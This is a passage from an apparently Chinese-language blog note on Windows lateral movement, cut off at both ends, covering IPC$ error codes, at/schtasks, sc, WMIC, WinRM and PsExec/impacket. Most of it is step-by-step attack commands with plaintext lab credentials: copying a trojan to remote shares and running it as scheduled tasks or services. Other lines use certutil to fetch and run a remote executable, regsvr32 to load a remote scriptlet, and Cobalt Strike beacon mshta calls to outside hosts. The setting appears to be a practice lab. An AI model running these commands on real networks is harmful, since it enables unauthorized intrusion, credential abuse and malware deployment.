src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130022829.png" alt="image-20220813002211620" style="zoom:50%;" /><h3 id="IPC-连接失败常见错误号"><a href="#IPC-连接失败常见错误号" class="headerlink" title="IPC$连接失败常见错误号"></a>IPC$连接失败常见错误号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一定要注意防火墙问题！！！！大部分内网机器都可能开了防火墙</span><br><span class="line"></span><br><span class="line">错误号 5，拒绝访问                      【很可能你使用的用户不是管理员权限，先提升权限】</span><br><span class="line">错误号 51，Windows 无法找到网络路径     【网络有问题】</span><br><span class="line">错误号 53，找不到网络路径               【ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）】</span><br><span class="line">错误号 67，找不到网络名                 【你的 lanmanworkstation 服务未启动；目标删除了 ipc$；】</span><br><span class="line">错误号 1219，提供的凭据与已存在的凭据集冲突     【你已经和对方建立了一个ipc$，请删除后再连】</span><br><span class="line">错误号 1326，未知的用户名或错误密码             【用户名或密码错误】</span><br><span class="line">错误号 1385，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="line">错误号 1792，试图登录，但是网络登录服务没有启动     【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="line">错误号 2242，此用户的密码已经过期                   【目标有帐号策略，强制定期要求更改密码】</span><br></pre></td></tr></table></figure><h2 id="IPC-AT-x2F-Schtasks"><a href="#IPC-AT-x2F-Schtasks" class="headerlink" title="IPC+AT&#x2F;Schtasks"></a>IPC+AT&#x2F;Schtasks</h2><ul><li>ipc 结合定时任务实现执行上传的文件 得到权限的过程 。主要是因为本地开启一个进程可以用<code>start a.exe</code> 但是通过net建立连接的远程主机是不支持start远程开启进程。所以我们才需要依赖定时任务</li><li>at&#x2F;schtasks都是定时任务，后面几个版本淘汰了at</li><li>打开计划任务的命令是<code>Taskschd.msc</code></li></ul><h3 id="AT简介"><a href="#AT简介" class="headerlink" title="AT简介"></a>AT简介</h3><p>AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks">https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks</a></p></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">建立IPC连接：</span><br><span class="line">net use \\10.10.10.30\c$ /user:pc\administrator &quot;1qaz@WSX&quot;</span><br><span class="line"></span><br><span class="line">上传木马文件59.exe：</span><br><span class="line">copy 59.exe \\10.10.10.30\c$</span><br><span class="line"></span><br><span class="line">查看远程主机时间：</span><br><span class="line">net time \\10.10.10.30</span><br><span class="line"></span><br><span class="line">AT命令添加任务：(注意执行可执行程序要带绝对路径，并且双斜杠)</span><br><span class="line">at \\10.10.10.30 19:08 c:\\59.exe</span><br><span class="line">at \\10.10.10.30 19:08 calc.exe这样执行不会有回显啊什么的 但是确切的会执行程序</span><br><span class="line"></span><br><span class="line">AT命令删除任务：</span><br><span class="line">at \\10.10.10.30 1 /delete</span><br><span class="line"></span><br><span class="line">AT命令查看任务：</span><br><span class="line">at \\10.10.10.30   #查看at任务列表，已经执行了的，不会显示。</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051859950.png" alt="image-20220805185712800"></p><p>注意：</p><blockquote><p>问题：执行at命令时，显示绑定句柄无效。<br>解决：echo 10.10.11.100 RemoteHost &gt; C:\Windows\System32\drivers\etc\hosts<br>AT命令在windows server 2012等新版系统中已被弃用<br>AT命令如果找不到网络路径，则判断是目标主机已禁用 Task Scheduler服务</p></blockquote><h3 id="Schtasks简介"><a href="#Schtasks简介" class="headerlink" title="Schtasks简介"></a>Schtasks简介</h3><p>由于 AT 在 windows server 2012 等新版系统中已被弃用，所以需要使用 schtasks  命令代替。</p><blockquote><p>允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Create     创建新计划任务。</span><br><span class="line">/Delete     删除计划任务。</span><br><span class="line">/Query      显示所有计划任务。</span><br><span class="line">/Change     更改计划任务属性。</span><br><span class="line">/Run        按需运行计划任务。</span><br><span class="line">/End        中止当前正在运行的计划任务。</span><br><span class="line">/ShowSid    显示与计划的任务名称相应的安全标识符。</span><br><span class="line">/?          显示此帮助消息。</span><br></pre></td></tr></table></figure><blockquote><p>更多请参考：<a href="https://blog.csdn.net/qq_39680564/article/details/88993633">https://blog.csdn.net/qq_39680564/article/details/88993633</a></p></blockquote><h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建任务</span><br><span class="line">schtasks /create /tn task1 /U 域\域用户 /P 域用户密码 /tr 命令 /sc ONSTART /s 域机器ip /RU system</span><br><span class="line">#运行任务</span><br><span class="line">schtasks /run /tn task1 /s 192.168.10.2 /U 域/域用户 /P 域用户密码</span><br><span class="line">#删除任务</span><br><span class="line">schtasks /F /delete /tn task1 /s 域机器ip /U 域\域用户 /p 域用户密码</span><br><span class="line"></span><br><span class="line">#具体细项的意义：</span><br><span class="line">schtasks /create             创建新的计划任务。</span><br><span class="line">         /sc schedule        指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><span class="line">         /mo modifier        指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><span class="line">         /tr &lt;TaskRun&gt;       指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。</span><br><span class="line">         /tn &lt;TaskName&gt;      指定任务的名称。</span><br></pre></td></tr></table></figure><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><ul><li>建立IPC连接</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\10.10.10.201 /user:PC\administrator &quot;1qaz@WSX&quot;</span><br><span class="line">net use</span><br></pre></td></tr></table></figure><ul><li>上传木马</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\10.10.10.201\c$</span><br><span class="line">copy c:\windows\temp\59.exe \\10.10.10.201\c$</span><br></pre></td></tr></table></figure><ul><li>远程主机创建定时任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.30 /u PC\administrator /p &quot;1qaz@WSX3&quot; /sc MINUTE /mo 1 /tn test2 /tr &quot;c:\59.exe&quot;</span><br><span class="line"></span><br><span class="line">/sc minute 间隔类型：分钟，minute、month、day、hours</span><br><span class="line">/mo 1间隔时常：每1，配合/sc，表示每1分钟</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081304694.png" alt="image-20220808130447566" style="zoom:50%;" /><ul><li>查看远程主机创建的定时任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br><span class="line">schtasks /query /s 10.10.10.201 /tn test2</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081305648.png" alt="image-20220808130550497" style="zoom:50%;" /><p>不更改代码页编码，直接查看可能会显示如下错误：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081306574.png" alt="image-20220808130607471" style="zoom:50%;" /><ul><li>立即执行Schtasks运行远程主机上的计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /run /s 10.10.10.201 /u de1ay\administrator /p &quot;1qaz@WSX3&quot; /tn test2</span><br></pre></td></tr></table></figure><ul><li>Schtasks删除远程主机上的计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /delete /tn At1 /s 10.10.10.201 /u administrator /p 1qaz@WSX3e</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081306353.png" alt="image-20220808130645254" style="zoom:50%;" /><h2 id="IPC-SC"><a href="#IPC-SC" class="headerlink" title="IPC+SC"></a>IPC+SC</h2><h3 id="SC简介"><a href="#SC简介" class="headerlink" title="SC简介"></a>SC简介</h3><p>sc 命令是Windows系统下通过<strong>注册、删除和查询系统服务</strong>的一个东西。</p><p>注意：</p><ul><li>关于Windows服务，其均是以system权限启动，所以我们如果通过注册建立了一个服务，通过服务开启的终端将也会具备system的权限！！另外需要管理员权限才能创建服务。也就是从管理员到系统权限的一个过程</li></ul><blockquote><p>sc命令详解：<a href="http://www.cnsendblog.com/?p=644">http://www.cnsendblog.com/?p=644</a></p><p>视频粗略讲解：<a href="https://www.bilibili.com/video/BV1t54y1e7Qj?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7">https://www.bilibili.com/video/BV1t54y1e7Qj?spm_id_from=333.337.search-card.all.click&amp;vd_source=e73a152dada4626bad49c30d848902f7</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法格式：</span><br><span class="line">SC [Servername] command Servicename [Optionname= Optionvalues]</span><br><span class="line"></span><br><span class="line">常见：</span><br><span class="line">sc \query 查看系统所有服务信息 ，询问一个服务的状态，也可以列举服务的状态类型。 有很多 一般会超出缓冲区限制，可以先复制到剪切板</span><br><span class="line">sc \query | clip查看全部内容</span><br><span class="line">sc \query +服务名   查看指定名称的信息</span><br><span class="line">sc 可以通过config设置服务的状态</span><br><span class="line">sc stop +服务名    停止服务</span><br><span class="line">sc config +服务名 start= 类型设置服务的启动类型（注意类型前有空格）</span><br><span class="line">sc qc --------------查询服务的配置信息</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>很多的命令需要管理员权限，所以我想说，在你操作这些东西的时候最好是管理员。</li><li>当你键入SC而不带任何参数时，SC.exe会显示帮助信息和可用的命令。当你键入SC紧跟着命令名称时，你可以得 到一个有关这个命令的详细列表。比如，键入sc create可以得到和create有关的列表。 但是除了一个命令，sc query，这会导出该系统中当前正在运行的所有服务和驱动程序的状态。 </li><li>当你使用start命令时，你可以传递一些参数（arguments）给服务的主函数，但是不是给服务进程的主函数。</li></ul><h3 id="SC远程注册服务"><a href="#SC远程注册服务" class="headerlink" title="SC远程注册服务"></a>SC远程注册服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sc远程创建服务</span><br><span class="line">sc \\10.10.10.201 create test binpath= &quot;c:\59.exe&quot; obj= &quot;de1ay\administrator&quot; password= 1qaz@WSX3e</span><br><span class="line">#sc启动指定服务</span><br><span class="line">sc \\10.10.10.201 start test</span><br><span class="line">#sc停止指定服务</span><br><span class="line">sc \\10.10.10.201 stop test</span><br><span class="line">sc \\10.10.10.201 delete test</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081307487.png" alt="image-20220808130724362" style="zoom:50%;" /><p><strong>注意几点：</strong></p><ul><li><p>binpath设置选项’&#x3D;’后面有一个空格,这种选项等会后面都要接一个等号再接选项值</p></li><li><p>Windows上注册一个服务的话，必须要是服务类型，也就是创建时候binpath的文件要是服务，而不是进程。因为如果不是一个服务的话，就会导致生成的服务和服务控制器之间无法通信，服务控制器会判定这个服务不是一个系统的服务。因此就会产生隔一段时间就会断掉的现象。那么如何解决此类问题呢？</p><p>方法一：进程迁移，在连接终端期间执行其他命令。将我们的连接稳固到其他进程中</p><p>方法二：通过sc注册服务，生成的木马要是服务类型。可以在cs中生成。</p></li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131628485.png" alt="image-20220813162825167" style="zoom:50%;" /><ul><li>另外在启动服务类型中分为本地系统启动和远程网络启动。注意最后一项</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131630098.png" alt="image-20220813163020930" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\10.10.10.201 qc test</span><br><span class="line"></span><br><span class="line">qc--------------查询服务的配置信息。</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081307785.png" alt="image-20220808130752669" style="zoom:50%;" /><h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><h3 id="WMIC简介"><a href="#WMIC简介" class="headerlink" title="WMIC简介"></a>WMIC简介</h3><p>WMI:(Windows Management Instrumentation Windows 管理规范)，是用户管理本地和远程计算机的一种模型。通过它<strong>可以访问、配置、管理和监视几乎所有的Windows资源</strong>。WMI的语法十分简单，基本上常见的命名空间、对象等用几乎一模一样。它对应的是Windows里的WMI服务（winmgmt）。</p><p>在 windows 2000之后的操作系统中内置了该服务。WMI使用公共信息模型（CIM）表示托管组件，其中包括系统、应用程序、网络等等。CIM中使用类表示管理对象，命名空间是一个类的集合。</p><p><strong>通过使用135端口上的远程过程调用(RPC)进行通信以进行远程访问,它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</strong> </p><p>而WMIC是为WMI提供的命令行界面。</p><blockquote><p>详细参考：<a href="https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic">https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmic</a><br><a href="https://blog.csdn.net/discover2210212455/article/details/82711930">https://blog.csdn.net/discover2210212455/article/details/82711930</a></p></blockquote><h4 id="命令使用条件"><a href="#命令使用条件" class="headerlink" title="命令使用条件"></a>命令使用条件</h4><ol><li>Windows Management Instrumentation 服务开启，端口TCP 135，默认开启</li><li>防火墙允许135、445等端口通信</li></ol><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>实际上wmic能对本地主机做什么操作 就能对远程主机做什么操作</p><ul><li>查询进程信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.30 /user:pc\administrator /password:1qaz@WSX process list brief</span><br></pre></td></tr></table></figure><p><strong>WMI不支持执行命令，而是支持执行文件</strong>，可以通过加相应的参数执行命令，比如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd.exe /c ipconfig&quot;</span><br></pre></td></tr></table></figure><ul><li>利用create创建进程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process call create /?</span><br><span class="line">调用                    [ 内/外 ]参数类型(&amp;T)状态        </span><br><span class="line">====                    ===========================        </span><br><span class="line">Create                  [IN ]CommandLine(STRING)                    (null)</span><br><span class="line">                        [IN ]CurrentDirectory(STRING)</span><br><span class="line">                        [IN ]ProcessStartupInformation(OBJECT)</span><br><span class="line">                        [OUT]ProcessId(UINT32)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd /c calc.exe&quot;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><blockquote><p>如果出现User credentials cannot be used for local connections,应该是调用calc.exe程序权限不够的问题</p></blockquote></li><li><blockquote><p>如果出现Description &#x3D; 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断WMI服务被禁用</p></blockquote></li></ul><p><strong>wmic命令缺点是没有回显，可以使用wmiexec.vbs脚本实现回显。</strong></p><ul><li>下载远程文件并执行上线</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;cmd /c  certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe</span><br><span class="line">是录播中的知识 文件下载</span><br><span class="line">我们可以用Windows下管理证书的certutil.exe程序下载远程主机的恶意文件，保存在c:/windows/temp/test.exe目录，再&amp;之后执行程序上线</span><br><span class="line">注意这个地方的远程主机（指的是我们已经拿下的web机器，因为内网pc机器不出网，所以只好放在这台机器上的web服务，给内网目标主机下载）</span><br><span class="line"></span><br><span class="line">实际上，当我们内网主机不能出网的时候，我们就可以通过在拿下的机器上做文章，放文件 </span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081313574.png" alt="image-20220808131343441"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:10.10.10.201 /user:administrator /password:1qaz@WSX3e process call create &quot;regsvr32 /s /n /u /i:http://192.168.78.117:8080/feY7nzY.sct scrobj.dll&quot;</span><br><span class="line"></span><br><span class="line">regsvr32 是com组件注册的一个命令。</span><br><span class="line">msf可以生成sct的文件，再通过远程加载sct，即可上线</span><br></pre></td></tr></table></figure><h3 id="msf利用wmic"><a href="#msf利用wmic" class="headerlink" title="msf利用wmic"></a>msf利用wmic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/local/wmi) &gt; options</span><br><span class="line">使用该模块，提供账户密码，就可以通过wmic执行命令~~~</span><br><span class="line">需要注意防火墙</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208220052488.png" alt="image-20220822005215206"></p><h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><h3 id="WinRM简介"><a href="#WinRM简介" class="headerlink" title="WinRM简介"></a>WinRM简介</h3><p>WinRM 指的是Windows远程管理服务，通过<strong>远程连接winRM模块可以操作windows命令行</strong>，默认监听端口5985（HTTP）和5986 (HTTPS)，在2012及以后默认开启。低于此版本要手动开启（靶场的PC机器和web机器都没有开启，需要手动开启）</p><h3 id="开启WinRM"><a href="#开启WinRM" class="headerlink" title="开启WinRM"></a>开启WinRM</h3><ul><li>判断本机是否开启WinRM服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm enumerate winrm/config/listener</span><br><span class="line">下图表示没有开启</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208131908850.png" alt="image-20220813190855609" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr 5985</span><br><span class="line">wmic service list brief | findstr WinRM</span><br></pre></td></tr></table></figure><ul><li>判断目标主机是否开启WinRM服务</li></ul><p>查看远程主机是否开启WinRM服务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServerScan.exe -h 10.10.10.30 -p 5985,5986</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081315752.png" alt="image-20220808131520618"></p><ul><li>查看远程WinRM服务是否正常：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test-wsman 10.10.10.30</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081315465.png" alt="image-20220808131537317"></p><ul><li>命令开启WinRM服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm quickconfig</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081316922.png" alt="image-20220808131617740" style="zoom: 50%;" /><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081316137.png" alt="image-20220808131639012"></p><ul><li>允许远程主机访问及访问远程主机（即开启允许外连）</li></ul><p>WinRM只允许当前域用户或者处于本机TrustedHosts列表中的远程主机进行访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm set winrm/config/client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081317247.png" alt="image-20220808131705064" style="zoom:50%;" /><h3 id="Winrs执行命令"><a href="#Winrs执行命令" class="headerlink" title="Winrs执行命令"></a>Winrs执行命令</h3><p>winrs内置命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e ipconfig</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e &quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="WinRM横向移动"><a href="#WinRM横向移动" class="headerlink" title="WinRM横向移动"></a>WinRM横向移动</h3><ul><li>利用winrm参数选项中的invoke参数，来对目标对象执行特定的方法。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process @&#123;Commandline=&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure><p>命令调用了Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081318509.png" alt="image-20220808131818326" style="zoom:50%;" /><ul><li>在远程机器上打开进程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process @&#123;Commandline=&quot;calc.exe&quot;&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br></pre></td></tr></table></figure><ul><li>在远程机器上创建服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test&quot;;DisplayName=&quot;test&quot;;PathName=&quot;cmd.exe /k c:\59.exe&quot;&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br><span class="line"></span><br><span class="line">调用Win32_Service类</span><br></pre></td></tr></table></figure><ul><li>在远程机器上启动服务</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081319710.png" alt="image-20220808131946534" style="zoom:50%;" /><h1 id="横向移动-外部工具篇"><a href="#横向移动-外部工具篇" class="headerlink" title="横向移动-外部工具篇"></a>横向移动-外部工具篇</h1><h2 id="Smbexec、Psexec"><a href="#Smbexec、Psexec" class="headerlink" title="Smbexec、Psexec"></a>Smbexec、Psexec</h2><h3 id="Psexec简介"><a href="#Psexec简介" class="headerlink" title="Psexec简介"></a>Psexec简介</h3><p>PsExec是一种轻巧的telnet替代品，可让您在其他系统上<strong>执行进程，并为控制台应用程序提供完整的交互性，而无需手动安装客户端软件</strong>。</p><blockquote><p>在”H:\ATTACK\权限提升\SysinternalsSuite\PsExec.exe”目录中有</p><p>psexec下载地址：<br><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a><br>impacket下载地址：<br>py：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br>exe：<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><p>impacket相较于微软官方的sysinternalsuits更好用</p></blockquote><h3 id="Psexec原理"><a href="#Psexec原理" class="headerlink" title="Psexec原理"></a>Psexec原理</h3><ol><li>ipc$ 连接,释放 Psexesvc.exe（即将服务程序复制到目标主机上）</li><li>通过服务管理 OpenSCManager 打开受害者机器上服务控制管理器的句柄（也就是打开服务控制管理器）</li><li>通过 CreateService 创建服务</li><li>获取服务句柄 OpenService 使用 StartService 启动服务</li></ol><h3 id="Psexec使用前提"><a href="#Psexec使用前提" class="headerlink" title="Psexec使用前提"></a>Psexec使用前提</h3><ol><li>对方主机开启了 admin$  共享，如果关闭了 admin$ 共享，会提示：找不到网络名</li><li>对方未开启防火墙</li><li>如果是工作组环境，则必须使用 administrator 用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li><li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</li></ol><h3 id="PsExec-exe使用"><a href="#PsExec-exe使用" class="headerlink" title="PsExec.exe使用"></a>PsExec.exe使用</h3><p>微软官方工具包</p><ul><li>直接使用</li></ul><blockquote><ul><li><p>第一次运行会弹框,输入 –accepteula 这个参数就可以绕过</p></li><li><p>如果出现找不到网络名，判断目标主机已禁用ADMIN$共享</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\PsExec.exe \\192.168.10.201 -u de1ay\Administrator -p 1qaz@WSX3e -s cmd.exe -accepteula</span><br></pre></td></tr></table></figure><ul><li>建立IPC连接，无需输入密码</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\IP /u:域名称\域账号 密码</span><br><span class="line">反弹cmd：</span><br><span class="line">psexec.exe \\10.10.10.201 -s cmd.exe -accepteula</span><br><span class="line">执行命令：</span><br><span class="line">psexec.exe \\10.10.10.201 whoami -accepteula</span><br></pre></td></tr></table></figure><ul><li>重要参数</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）</span><br><span class="line">-d 不等待程序执行完就返回</span><br><span class="line">比如想上传一个本地的getpass到你远程连接的服务器上去运行（很方便）:</span><br><span class="line">Psexec.exe \\ip -u user -p pass -c c:\getpass.exe –d</span><br></pre></td></tr></table></figure><ul><li>Cobaltstrike</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell psexec.exe \\10.10.10.201 -u de1ay\Administrator -p 1qaz@WSX3e whoami</span><br><span class="line">beacon&gt; shell psexec.exe \\10.10.10.201 -u de1ay\Administrator -p 1qaz@WSX3e mshta http://192.168.78.117:8088/download/file.ext</span><br></pre></td></tr></table></figure><p>psexec 传递命令时不要添加双引号否则会爆 “系统找不到指定的文件” 的错误。</p><h3 id="Psexec-py"><a href="#Psexec-py" class="headerlink" title="Psexec.py"></a>Psexec.py</h3><p>impacket套件中的Psexec与官方psexec.exe相比会自动删除服务，增加隐蔽性</p><ul><li>交互式命令行</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;psexec.py de1ay/administrator:1qaz@WSX3e@10.10.10.201</span><br><span class="line"></span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line">[*] Requesting shares on 10.10.10.201.....请求文件共享</span><br><span class="line">[*] Found writable share ADMIN$找到一个可写的文件共享</span><br><span class="line">[*] Uploading file DabwFVJj.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Creating service KNri on 10.10.10.201.....</span><br><span class="line">[*] Starting service KNri.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;exit退出会会自动清理文件</span><br><span class="line">[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Stoping service KNri.....</span><br><span class="line">[*] Removing service KNri.....</span><br><span class="line">[*] Removing file DabwFVJj.exe.....</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081329748.png" alt="image-20220808132958587" style="zoom:33%;" /><ul><li>直接执行命令</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;psexec.exe de1ay/administrator:1qaz@WSX3e@10.10.10.201 whoami</span><br><span class="line">Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</span><br><span class="line">[*] Requesting shares on 10.10.10.201.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file SLZVAxLl.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Creating service slqx on 10.10.10.201.....</span><br><span class="line">[*] Starting service slqx.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">nt authority\system</span><br><span class="line">[*] Process whoami finished with ErrorCode: 0, ReturnCode: 0</span><br><span class="line">[*] Opening SVCManager on 10.10.10.201.....</span><br><span class="line">[*] Stoping service slqx.....</span><br><span class="line">[*] Removing service slqx.....</span><br><span class="line">[*] Removing file SLZVAxLl.exe.....</span><br></pre></td></tr></table></figure><ul><li>Cobaltstrike</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell c:\psexec.exe administrator:1qaz@WSX@10.10.10.201 whoami</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell c:\psexec.exe administrator:1qaz@WSX@10.10.10.201 mshta http://192.168.78.104:80/download/file.ext</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081331667.png" alt="image-20220808133147513" style="zoom:50%;" /><h3 id="Smbexec-py"><a href="#Smbexec-py" class="headerlink" 